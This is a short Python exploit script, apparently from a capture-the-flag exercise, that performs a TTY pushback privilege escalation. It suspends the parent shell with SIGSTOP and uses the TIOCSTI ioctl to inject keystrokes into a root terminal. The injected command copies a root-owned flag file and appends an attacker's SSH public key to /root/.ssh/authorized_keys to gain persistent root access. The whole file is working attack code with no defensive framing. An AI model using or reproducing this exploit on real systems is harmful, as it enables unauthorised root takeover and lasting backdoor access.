#!/usr/bin/env python3
# tty pushback
# original script from https://www.errno.fr/TTYPushback.html
# assistance from ChatGPT used.
# update public_key with your public key

import fcntl
import termios
import os
import sys
import signal

# Send SIGSTOP to pause the low-privileged shell
os.kill(os.getppid(), signal.SIGSTOP)

# Inject each character of the command into the parent root shell

public_key = ''


cmd = f"cat /root/flag3.txt > /home/orville/flag3.txt && echo '{public_key}' | tee -a /root/.ssh/authorized_keys\n"


for char in cmd:
    fcntl.ioctl(0, termios.TIOCSTI, char)
